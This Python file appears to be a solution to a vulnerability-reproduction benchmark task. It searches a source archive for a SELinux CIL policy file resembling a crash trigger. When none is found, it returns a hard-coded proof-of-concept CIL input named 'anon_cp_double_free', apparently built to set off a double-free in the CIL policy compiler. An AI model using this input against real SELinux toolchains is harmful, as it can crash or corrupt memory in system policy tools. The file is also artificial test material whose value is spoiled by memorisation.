import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        fallback = self._fallback_poc()

        try:
            with tarfile.open(src_path, "r:*") as tf:
                best_data = None
                best_key = None

                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    name_lower = member.name.lower()
                    if not name_lower.endswith(".cil"):
                        continue

                    f = tf.extractfile(member)
                    if f is None:
                        continue

                    try:
                        data = f.read()
                    except Exception:
                        continue
                    if not data:
                        continue

                    try:
                        text = data.decode("utf-8", "ignore")
                    except Exception:
                        text = ""
                    tlower = text.lower()

                    base = abs(len(data) - 340)
                    penalty = 0
                    if "anonymous" in tlower:
                        penalty -= 50
                    if "classpermissionset" in tlower:
                        penalty -= 20
                    if "classpermission" in tlower:
                        penalty -= 10
                    if "(macro" in tlower:
                        penalty -= 10
                    if "(call" in tlower:
                        penalty -= 5

                    score = base + penalty
                    key = (score, base, len(data))

                    if best_key is None or key < best_key:
                        best_key = key
                        best_data = data

                if best_data is not None:
                    return best_data
        except Exception:
            pass

        return fallback

    def _fallback_poc(self) -> bytes:
        poc = """(block anon_cp_double_free
    (class file (read write getattr))
    (macro make_cps
        ((cp classpermission))
        (classpermissionset cps1 (cp))
    )
    (call make_cps
        ( ((file (read))) )
    )
)
"""
        return poc.encode("ascii", "ignore")
